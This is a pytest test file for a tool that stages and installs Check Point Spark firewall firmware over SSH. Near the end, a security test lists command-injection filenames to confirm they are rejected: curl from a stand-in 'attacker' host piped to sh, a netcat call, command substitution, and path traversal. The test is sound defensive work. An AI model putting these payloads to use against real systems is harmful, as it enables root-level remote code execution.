from __future__ import annotations

import asyncio
import hashlib
import io
import shlex
from pathlib import Path

import pytest

from convoy.credentials import CredentialStore, JobCredentialVault
from convoy.errors import (
    CredentialError,
    InventoryError,
    JobError,
    PackageError,
    TransportError,
)
from convoy.inventory import Host, Inventory, Role, Site
from convoy.jobs import JobRunner
from convoy.packages import PackageStore
from convoy.services.common import EnvironmentRegistry, HostConnector
from convoy.services.spark_patching import (
    SparkPatchingService,
    builds_match,
    parse_fw_ver,
)
from convoy.store import JobStatus, Store

from .fakes import FakeTransport, make_factory

IMG = "fw1_vx_dep_R81_10_17_996004936.img"
IMG_BUILD = "936"  # last 3 digits of the numeric id above — what fw ver must echo back
IMG_CONTENT = b"fake spark firmware bytes"
IMG_SHA1 = hashlib.sha1(IMG_CONTENT).hexdigest()
FW_VER_MATCH = f"This is Check Point's 1550 Appliance R81.10.17 - Build {IMG_BUILD}"
FW_VER_MISMATCH = "This is Check Point's 1550 Appliance R81.10.17 - Build 892"


@pytest.fixture
def store(tmp_path: Path) -> Store:
    return Store(tmp_path / "orch.db")


@pytest.fixture
def creds(store: Store) -> CredentialStore:
    store.insert_environment("default", credential_storage_enabled=True)
    cs = CredentialStore(store, master_key="unit test master key")
    cs.put_set(
        "default",
        "spark-primary",
        ssh_username="admin",
        ssh_password="gaia-pw",
        expert_password="expert-pw",
    )
    # Simulate a legacy set that predates the expert-password requirement —
    # CredentialStore.put_set itself no longer allows creating one without an
    # expert password, so this drops it directly via the store, bypassing
    # that validation, to exercise the "the assigned set has none" path.
    cs.put_set(
        "default",
        "no-expert",
        ssh_username="admin",
        ssh_password="gaia-pw",
        expert_password="temp-pw",
    )
    row = store.get_credential_set_by_name("default", "no-expert")
    assert row is not None
    store.upsert_credential_set(row.model_copy(update={"expert_password_ct": None}))
    return cs


def _assign(store: Store, inventory: Inventory, host_name: str, set_name: str) -> None:
    row = store.get_credential_set_by_name("default", set_name)
    assert row is not None
    for site in inventory.sites:
        for host in site.hosts:
            if host.name == host_name:
                host.credential_set_id = row.id


@pytest.fixture
def packages(store: Store, tmp_path: Path) -> PackageStore:
    ps = PackageStore(store, tmp_path / "packages")
    ps.add_stream(IMG, io.BytesIO(IMG_CONTENT))
    ps.add_stream("gaia_jhf.tgz", io.BytesIO(b"not a spark image"))
    return ps


@pytest.fixture
def inventory() -> Inventory:
    return Inventory(
        sites=[
            Site(
                name="t",
                hosts=[
                    Host(name="spark-01", address="192.0.2.30", role=Role.SPARK_FIREWALL),
                    Host(name="spark-02", address="192.0.2.31", role=Role.SPARK_FIREWALL),
                    Host(name="fw-gaia", address="192.0.2.20", role=Role.GATEWAY),
                ],
            )
        ]
    )


@pytest.fixture
def transport() -> FakeTransport:
    return FakeTransport(
        responses={
            "sha1sum": f"{IMG_SHA1}  /storage/{IMG}",
            "fw ver": FW_VER_MATCH,
        },
        expert_command_outputs={"bashUser on": "Done.", "bashUser off": "Done."},
    )


@pytest.fixture
def service(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
    transport: FakeTransport,
) -> SparkPatchingService:
    _assign(store, inventory, "spark-01", "spark-primary")
    _assign(store, inventory, "spark-02", "no-expert")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, make_factory(transport)))
    return SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
        # Real reachability/reconnect polling is pure network I/O with no
        # bearing on the job-orchestration logic these tests exercise —
        # skip it so the fake transport's own `connect()` (always
        # immediately available) is the only thing standing in for it.
        probe_reachable=lambda address, port: True,
    )


def _run(service: SparkPatchingService) -> None:
    asyncio.run(service.runner.run_until_idle())


# -- submission validation --------------------------------------------------------


def test_submit_test_credentials_rejects_unknown_host(service: SparkPatchingService) -> None:
    with pytest.raises(InventoryError, match="not found"):
        service.submit_test_credentials("default", "nope")


def test_submit_test_credentials_rejects_non_spark_host(service: SparkPatchingService) -> None:
    with pytest.raises(InventoryError, match="not a Spark firewall"):
        service.submit_test_credentials("default", "fw-gaia")


def test_submit_transfer_rejects_non_image_package(service: SparkPatchingService) -> None:
    with pytest.raises(JobError, match="isn't a Spark firmware image"):
        service.submit_transfer("default", "spark-01", "gaia_jhf.tgz")


def test_submit_install_requires_confirmation(service: SparkPatchingService) -> None:
    with pytest.raises(JobError, match="confirmation"):
        service.submit_install("default", "spark-01", IMG, confirmed=False)


def test_submit_install_rejects_non_image_package(service: SparkPatchingService) -> None:
    with pytest.raises(JobError, match="isn't a Spark firmware image"):
        service.submit_install("default", "spark-01", "gaia_jhf.tgz", confirmed=True)


def test_submit_test_credentials_rejects_busy_host(
    service: SparkPatchingService, store: Store
) -> None:
    service.submit_test_credentials("default", "spark-01")
    with pytest.raises(JobError, match="already"):
        service.submit_test_credentials("default", "spark-01")


# -- test_credentials job -----------------------------------------------------------


def test_test_credentials_succeeds(
    service: SparkPatchingService, store: Store, transport: FakeTransport
) -> None:
    job = service.submit_test_credentials("default", "spark-01")
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.SUCCEEDED
    assert transport.closed is True
    assert len(transport.interactive_shells) == 1
    assert transport.interactive_shells[0].closed is True
    # No mutating command was ever run — this job only proves login + expert.
    assert not any("bashUser" in c for c in transport.commands)


def test_test_credentials_short_circuits_without_expert_password(
    service: SparkPatchingService, store: Store, transport: FakeTransport
) -> None:
    # Storage-enabled environments now gate this at submission time
    # (HostConnector.require_credentials(require_expert=True)), same as a
    # missing SSH secret already did — a config problem, not a connectivity
    # one, so it fails before a job is even queued.
    with pytest.raises(CredentialError, match="no expert-mode password"):
        service.submit_test_credentials("default", "spark-02")  # "no-expert" set
    # No SSH attempted at all — the check happens before any connect.
    assert transport.interactive_shells == []
    assert transport.closed is False


def test_test_credentials_fails_on_wrong_expert_password(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
) -> None:
    transport = FakeTransport(expert_wrong_password=True)
    _assign(store, inventory, "spark-01", "spark-primary")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, make_factory(transport)))
    service = SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
    )
    job = service.submit_test_credentials("default", "spark-01")
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.FAILED
    assert finished.error is not None and "wrong password" in finished.error


def test_test_credentials_succeeds_without_escalating_when_bashuser_is_on(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
) -> None:
    """A Spark gateway configured `bashUser on` lands you in expert at login.
    The job must not send `expert` there — and must say so, because a run that
    never escalated never exercised the expert password (operator-specified
    2026-08-27)."""
    transport = FakeTransport(expert_already_expert=True, expert_wrong_password=True)
    _assign(store, inventory, "spark-01", "spark-primary")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, make_factory(transport)))
    service = SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
    )
    job = service.submit_test_credentials("default", "spark-01")
    _run(service)

    finished = store.get_job(job.id)
    # expert_wrong_password would fail this job if it had tried to escalate at
    # all — succeeding here is the proof that it didn't.
    assert finished.status is JobStatus.SUCCEEDED
    shell = transport.interactive_shells[0]
    assert "expert" not in shell.sent
    messages = " ".join(e.message for e in store.events(job.id))
    assert "bashUser on" in messages
    assert "expert password was not tested" in messages


def test_test_credentials_names_the_username_it_will_log_in_as(
    service: SparkPatchingService, store: Store
) -> None:
    """The username that actually logs in is the credential set's, and the job
    log now says so — the operator should not have to read the device's own
    auth log to find out which account was tried."""
    job = service.submit_test_credentials("default", "spark-01")
    _run(service)
    assert store.get_job(job.id).status is JobStatus.SUCCEEDED
    messages = " ".join(e.message for e in store.events(job.id))
    assert "as 'admin' (credential set)" in messages


def test_test_credentials_warns_when_the_set_names_no_username(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
) -> None:
    """A set with no ssh_username authenticates as whatever stale value sits in
    Host.ssh_user, and the only evidence used to be a rejected login in the
    DEVICE's auth log naming an account the operator never chose (real report,
    2026-08-27: an SG1800 refusing `admin`). put_set now refuses to store such a
    set, but rows predating that rule still exist, so the job says which account
    it fell back to and why."""
    row = store.get_credential_set_by_name("default", "spark-primary")
    assert row is not None
    row.ssh_username = None  # a row stored before the username became mandatory
    store.upsert_credential_set(row)

    _assign(store, inventory, "spark-01", "spark-primary")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, make_factory(FakeTransport())))
    service = SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
    )
    job = service.submit_test_credentials("default", "spark-01")
    _run(service)

    events = store.events(job.id)
    warning = next((e for e in events if e.level == "warning"), None)
    assert warning is not None, [e.message for e in events]
    assert "has no SSH username" in warning.message
    # ...and names the value it actually fell back to, so the account showing up
    # in the device's auth log is identifiable from this line alone.
    assert "'admin'" in warning.message


# -- transfer job -------------------------------------------------------------------


def test_transfer_happy_path(
    service: SparkPatchingService, store: Store, transport: FakeTransport
) -> None:
    job = service.submit_transfer("default", "spark-01", IMG)
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.SUCCEEDED
    assert len(transport.puts) == 1
    local_path, remote_path = transport.puts[0]
    assert remote_path == f"/storage/{IMG}"
    assert Path(local_path).name == IMG
    # Two interactive (expert-mode) sessions: enabling bashUser and disabling
    # it again afterwards — the transfer itself doesn't need one.
    assert len(transport.interactive_shells) == 2
    events = [e.message for e in store.events(job.id)]
    assert any("bashUser on output" in e and "Done." in e for e in events)
    assert any("bashUser off output" in e and "Done." in e for e in events)
    assert not any("upgrade_revert_image.sh" in e for e in events)  # transfer only
    assert any("staged in /storage" in e and "Install button" in e for e in events)
    cached = store.get_server_state("default", "spark-01")
    assert cached is not None and cached.installable == [IMG]


def test_transfer_fails_on_sha1_mismatch(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
) -> None:
    transport = FakeTransport(responses={"sha1sum": "0" * 40 + f"  /storage/{IMG}"})
    _assign(store, inventory, "spark-01", "spark-primary")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, make_factory(transport)))
    service = SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
    )
    job = service.submit_transfer("default", "spark-01", IMG)
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.FAILED
    assert finished.error is not None and "sha1 mismatch" in finished.error
    # Never reached the disable-bashUser phase — only the enable one ran.
    assert len(transport.interactive_shells) == 1
    cached = store.get_server_state("default", "spark-01")
    assert cached is None or IMG not in cached.installable


def test_transfer_fails_without_expert_password(
    service: SparkPatchingService, store: Store, transport: FakeTransport
) -> None:
    with pytest.raises(CredentialError, match="no expert-mode password"):
        service.submit_transfer("default", "spark-02", IMG)
    assert transport.interactive_shells == []


def _low_df(mount: str) -> str:
    return (
        "Filesystem     1024-blocks     Used  Available Capacity Mounted on\n"
        f"/dev/sda1               10        9          0       99% {mount}"
    )


def test_transfer_fails_when_storage_has_insufficient_space(
    service: SparkPatchingService, store: Store, transport: FakeTransport
) -> None:
    # Checked before ever touching device state — no bashUser, no transfer.
    transport.responses["df -Pk /storage"] = _low_df("/storage")
    job = service.submit_transfer("default", "spark-01", IMG)
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.FAILED
    assert finished.error is not None
    assert "not enough free space on /storage" in finished.error
    assert transport.interactive_shells == []
    assert transport.puts == []
    cached = store.get_server_state("default", "spark-01")
    assert cached is None or IMG not in cached.installable


def test_transfer_job_logs_storage_space_ok_when_sufficient(
    service: SparkPatchingService, store: Store, transport: FakeTransport
) -> None:
    # No override needed — FakeTransport's own `df -Pk` fallback reports
    # plenty of free space (see tests/fakes.py).
    job = service.submit_transfer("default", "spark-01", IMG)
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.SUCCEEDED, finished.error
    events = [e.message for e in store.events(job.id)]
    assert any("disk space OK on /storage" in e for e in events)


# -- install job --------------------------------------------------------------------


def test_transfer_then_install_full_flow(
    service: SparkPatchingService, store: Store, transport: FakeTransport
) -> None:
    """The realistic sequence: transfer stages the image and lists it as
    installable, install (a separate, later job) runs the upgrade and drops
    it from that list again."""
    transfer_job = service.submit_transfer("default", "spark-01", IMG)
    _run(service)
    assert store.get_job(transfer_job.id).status is JobStatus.SUCCEEDED
    assert store.get_server_state("default", "spark-01").installable == [IMG]

    install_job = service.submit_install("default", "spark-01", IMG, confirmed=True)
    _run(service)
    finished = store.get_job(install_job.id)
    assert finished.status is JobStatus.SUCCEEDED
    events = [e.message for e in store.events(install_job.id)]
    # bashUser off is transfer's job (already ran above) — install doesn't
    # repeat it.
    assert not any("bashUser" in e for e in events)
    assert any("upgrade_revert_image.sh" in e for e in events)
    assert any("session closed — device is rebooting" in e for e in events)
    assert any(f"confirmed: fw ver reports build {IMG_BUILD}" in e for e in events)
    assert store.get_server_state("default", "spark-01").installable == []


def test_install_fails_on_stale_mount(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
) -> None:
    """Real-hardware-confirmed 2026-08-19 (see upgrade_revert_image.sh's own
    mount_pfrm_inactive_part(), which checks `mount`'s exit status, not
    mke2fs's): mke2fs refusing because the inactive partition is already
    mounted doesn't necessarily abort the script, so this must fail the job
    itself rather than let a silently-stale upgrade report as succeeded."""
    remote_path = f"/storage/{IMG}"
    transport = FakeTransport(
        expert_command_outputs={
            "bashUser on": "Done.",
            "bashUser off": "Done.",
            f"upgrade_revert_image.sh {remote_path} upgrade safe": (
                "mke2fs 1.44.1 (24-Mar-2018)\n"
                "/dev/mmcblk1p6 is mounted; will not make a filesystem here!\n"
                "yes: Broken pipe\n"
                "tune2fs 1.44.1 (24-Mar-2018)"
            ),
        },
    )
    _assign(store, inventory, "spark-01", "spark-primary")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, make_factory(transport)))
    service = SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
    )
    job = service.submit_install("default", "spark-01", IMG, confirmed=True)
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.FAILED
    assert finished.error is not None
    assert "already mounted" in finished.error or "mke2fs" in finished.error
    assert "stale mount" in finished.error


def test_install_succeeds_after_channel_closes_on_upgrade(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
) -> None:
    """Channel-closed branch: the device may drop the connection as it
    begins rebooting, possibly before ever returning control. That alone
    isn't the verdict anymore (operator-directed 2026-08-20) — the job goes
    on to confirm the reboot actually landed on the new build via
    ping/reconnect/fw ver."""
    transport = FakeTransport(
        expert_drop_on="upgrade_revert_image.sh",
        responses={"fw ver": FW_VER_MATCH},
    )
    _assign(store, inventory, "spark-01", "spark-primary")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, make_factory(transport)))
    service = SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
        probe_reachable=lambda address, port: True,
    )
    job = service.submit_install("default", "spark-01", IMG, confirmed=True)
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.SUCCEEDED
    events = [e.message for e in store.events(job.id)]
    assert any("treating as the scheduled reboot" in e for e in events)
    assert any(f"confirmed: fw ver reports build {IMG_BUILD}" in e for e in events)
    assert finished.status_text is None  # cleared on success


def test_install_succeeds_when_reboot_never_observed_but_build_matches(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
) -> None:
    """The script returns control normally, but wait_for_close never
    actually sees this session disconnect (e.g. the reboot flag update
    silently failed on the device). Rather than hang waiting for a
    disconnect that may never come, this session is closed and the flow
    verifies directly instead — and since the build genuinely matches here,
    the job still succeeds."""
    transport = FakeTransport(
        expert_command_outputs={f"upgrade_revert_image.sh /storage/{IMG} upgrade safe": "ok"},
        expert_reboot_closes=False,
        responses={"fw ver": FW_VER_MATCH},
    )
    _assign(store, inventory, "spark-01", "spark-primary")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, make_factory(transport)))
    service = SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
        probe_reachable=lambda address, port: True,
    )
    job = service.submit_install("default", "spark-01", IMG, confirmed=True)
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.SUCCEEDED
    events = [e.message for e in store.events(job.id)]
    assert any("no reboot happened" in e for e in events)
    assert any(f"confirmed: fw ver reports build {IMG_BUILD}" in e for e in events)


def test_install_fails_when_build_never_changes_despite_timeout(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
) -> None:
    """Real-hardware-confirmed 2026-08-20: a deadline elapsing with the SSH
    channel still open is not evidence the device is rebooting (unlike a
    genuine channel-closed drop, see the sibling test above) — the script may
    still be legitimately running. This no longer settles the job's outcome
    by itself (that used to mean an immediate FAILED with "we don't know");
    ping/reconnect/fw-ver decide it now. Here the device genuinely never
    took the new build — something the old code couldn't have caught at all,
    since it gave up as soon as the timeout fired. The original session is
    still deliberately left open (not force-closed) even though the job
    eventually resolves via a separate, fresh connection."""
    transport = FakeTransport(
        expert_timeout_on="upgrade_revert_image.sh",
        responses={"fw ver": FW_VER_MISMATCH},
    )
    _assign(store, inventory, "spark-01", "spark-primary")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, make_factory(transport)))
    service = SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
        probe_reachable=lambda address, port: True,
    )
    job = service.submit_install("default", "spark-01", IMG, confirmed=True)
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.FAILED
    assert finished.error is not None
    assert "did not come up on the installed image" in finished.error
    assert "892" in finished.error and IMG_BUILD in finished.error
    assert transport.interactive_shells[0].closed is False


def test_install_times_out_waiting_for_ping(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
) -> None:
    transport = FakeTransport(responses={"fw ver": FW_VER_MATCH})
    _assign(store, inventory, "spark-01", "spark-primary")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, make_factory(transport)))
    service = SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
        probe_reachable=lambda address, port: False,  # never comes back
        ping_timeout=0.05,
        ping_poll_interval=0.01,
    )
    job = service.submit_install("default", "spark-01", IMG, confirmed=True)
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.TIMED_OUT
    assert finished.error is not None
    assert "never responded" in finished.error


def test_install_times_out_waiting_for_reconnect(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
) -> None:
    """Reachability (ping) succeeding doesn't mean SSH is ready yet — sshd
    can come up slightly later. If it never does, this is a distinct
    TIMED_OUT outcome from the ping-timeout case above."""
    transport = FakeTransport(responses={"fw ver": FW_VER_MATCH})
    calls = {"n": 0}

    def flaky_factory(host: object, creds: object) -> FakeTransport:
        calls["n"] += 1
        if calls["n"] == 1:
            return transport  # the initial connection, for the upgrade itself
        raise TransportError("fake: connection refused")

    _assign(store, inventory, "spark-01", "spark-primary")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, flaky_factory))
    service = SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
        probe_reachable=lambda address, port: True,
        reconnect_timeout=0.05,
        reconnect_poll_interval=0.01,
    )
    job = service.submit_install("default", "spark-01", IMG, confirmed=True)
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.TIMED_OUT
    assert finished.error is not None
    assert "could not re-establish SSH" in finished.error


def test_install_fails_when_fw_ver_output_has_no_build_number(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
) -> None:
    transport = FakeTransport(responses={"fw ver": "unexpected garbage, no build info"})
    _assign(store, inventory, "spark-01", "spark-primary")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, make_factory(transport)))
    service = SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
        probe_reachable=lambda address, port: True,
    )
    job = service.submit_install("default", "spark-01", IMG, confirmed=True)
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.FAILED
    assert finished.error is not None
    assert "couldn't find a build number" in finished.error


def test_install_fails_when_package_filename_has_no_build_number(
    store: Store,
    creds: CredentialStore,
    packages: PackageStore,
    inventory: Inventory,
) -> None:
    """Checked before any SSH connection — no point running the upgrade only
    to discover afterward that its own filename can't be used to confirm
    it. submit_install doesn't check the package actually exists (same
    trust-the-picker posture as everywhere else here), so this doesn't need
    a real staged file."""
    transport = FakeTransport()
    _assign(store, inventory, "spark-01", "spark-primary")
    registry = EnvironmentRegistry()
    registry.add("default", HostConnector(inventory, creds, make_factory(transport)))
    service = SparkPatchingService(
        registry=registry,
        packages=packages,
        runner=JobRunner(store),
        vault=JobCredentialVault(),
        store=store,
    )
    job = service.submit_install("default", "spark-01", "sparkfw.img", confirmed=True)
    _run(service)
    finished = store.get_job(job.id)
    assert finished.status is JobStatus.FAILED
    assert finished.error is not None
    assert "doesn't match the expected Spark image filename convention" in finished.error
    assert transport.interactive_shells == []  # never even connected


def test_install_fails_without_expert_password(
    service: SparkPatchingService, store: Store, transport: FakeTransport
) -> None:
    with pytest.raises(CredentialError, match="no expert-mode password"):
        service.submit_install("default", "spark-02", IMG, confirmed=True)
    assert transport.interactive_shells == []


# -- detect (refresh) --------------------------------------------------------------


def test_parse_fw_ver_strips_banner_prefix() -> None:
    assert (
        parse_fw_ver("This is Check Point's 1550 Appliance R81.10.17 - Build 892\n")
        == "1550 Appliance R81.10.17 - Build 892"
    )


def test_parse_fw_ver_falls_back_to_trimmed_line_without_prefix() -> None:
    assert parse_fw_ver("  some other banner text  \n") == "some other banner text"


def test_detect_runs_fw_ver_not_cpuse(
    service: SparkPatchingService, store: Store, transport: FakeTransport
) -> None:
    transport.responses["fw ver"] = "This is Check Point's 1550 Appliance R81.10.17 - Build 892"
    version = service.detect("default", "spark-01")
    assert version == "1550 Appliance R81.10.17 - Build 892"
    assert any(c == "fw ver" for c in transport.commands)
    assert not any("installer" in c or "cluster state" in c for c in transport.commands)


def test_detect_caches_state_with_no_jhf_or_agent_build(
    service: SparkPatchingService, store: Store, transport: FakeTransport
) -> None:
    transport.responses["fw ver"] = "This is Check Point's 1550 Appliance R81.10.17 - Build 892"
    service.detect("default", "spark-01")
    cached = store.get_server_state("default", "spark-01")
    assert cached is not None
    assert cached.version == "1550 Appliance R81.10.17 - Build 892"
    assert cached.jhf is None
    assert cached.agent_build is None
    assert cached.cluster_role is None
    assert cached.installable == []
    assert cached.installed == []


def test_detect_rejects_non_spark_host(service: SparkPatchingService) -> None:
    with pytest.raises(InventoryError, match="not a Spark firewall"):
        service.detect("default", "fw-gaia")


def test_detect_preserves_installable_across_refresh(
    service: SparkPatchingService, store: Store, transport: FakeTransport
) -> None:
    """Regression guard: detect() used to build a brand-new ServerStateRow on
    every refresh, silently wiping out whatever a transfer job had staged
    into installable (see submit_transfer / _mark_staged)."""
    service.submit_transfer("default", "spark-01", IMG)
    _run(service)
    assert store.get_server_state("default", "spark-01").installable == [IMG]

    transport.responses["fw ver"] = "This is Check Point's 1550 Appliance R81.10.17 - Build 892"
    service.detect("default", "spark-01")
    cached = store.get_server_state("default", "spark-01")
    assert cached is not None
    assert cached.version == "1550 Appliance R81.10.17 - Build 892"
    assert cached.installable == [IMG]


def test_ensure_host_free_shared_with_cpuse_still_works(store: Store) -> None:
    """Regression guard for the ensure_host_free extraction (moved from
    PatchingService to services.common) — importable and callable the same
    way from either service."""
    from convoy.services.common import ensure_host_free

    store.insert_environment("default", credential_storage_enabled=True)
    ensure_host_free(store, "default", "anything")  # no jobs yet — must not raise


# -- install filename safety (security) -------------------------------------------
#
# _run_upgrade interpolates the staged path into
# ``upgrade_revert_image.sh <path> upgrade safe`` and sends it to an
# expert-mode (root) pty. Neither the .img suffix test nor the build-number
# regex excludes shell metacharacters, so submit_install must apply the
# package-name allowlist itself. See services/spark_patching.py.


@pytest.mark.parametrize(
    "payload",
    [
        "x;curl http://attacker/p|sh;_1.img",
        "a$(id)_1.img",
        "a`id`_1.img",
        "a b_1.img",
        "../../etc/passwd_1.img",
        "x|nc attacker 1234_1.img",
    ],
)
def test_submit_install_rejects_shell_metacharacters_in_filename(
    service: SparkPatchingService, transport: FakeTransport, payload: str
) -> None:
    """Each payload satisfies both the .img suffix check and the trailing
    build-number regex — the allowlist is the only thing standing between
    them and a root shell."""
    with pytest.raises(PackageError, match="unsafe package filename"):
        service.submit_install("default", "spark-01", payload, confirmed=True)
    assert transport.interactive_shells == []  # never connected


def test_install_command_is_shell_quoted_at_the_sink(
    service: SparkPatchingService, store: Store, transport: FakeTransport
) -> None:
    """Defence in depth: even with a validated name, the sink quotes."""
    job = service.submit_install("default", "spark-01", IMG, confirmed=True)
    _run(service)
    assert store.get_job(job.id) is not None
    sent = [line for sh in transport.interactive_shells for line in sh.sent]
    upgrade = [line for line in sent if "upgrade_revert_image.sh" in line]
    assert upgrade, f"no upgrade command issued; sent={sent!r}"
    assert shlex.split(upgrade[0])[1] == f"/storage/{IMG}"


# -- build confirmation uses all available precision (M4) --------------------------
#
# `fw ver` renders a truncated form of the id in the .img filename, so the two
# can only be compared on their overlap — but the overlap is however many digits
# fw ver actually gave us, not a fixed three. Three digits alone left a 1-in-1000
# chance of confirming a device that never took the upgrade.


def test_builds_match_on_the_full_common_suffix() -> None:
    assert builds_match("996004936", "936")  # what this device actually reports
    assert builds_match("996004936", "004936")  # more digits -> still a match
    assert builds_match("996004936", "996004936")


def test_builds_differing_beyond_the_last_three_digits_are_rejected() -> None:
    """The point of the change: fw ver reporting "004935" against an image
    "...004936" shares its last three digits, so a fixed 3-digit compare would
    have confirmed a device that never took the upgrade."""
    assert not builds_match("996004936", "004935")
    assert not builds_match("996004936", "111000935")


def test_builds_refuse_to_confirm_on_too_little_overlap() -> None:
    """A one- or two-digit overlap is not evidence of anything."""
    assert not builds_match("996004936", "36")
    assert not builds_match("996004936", "6")
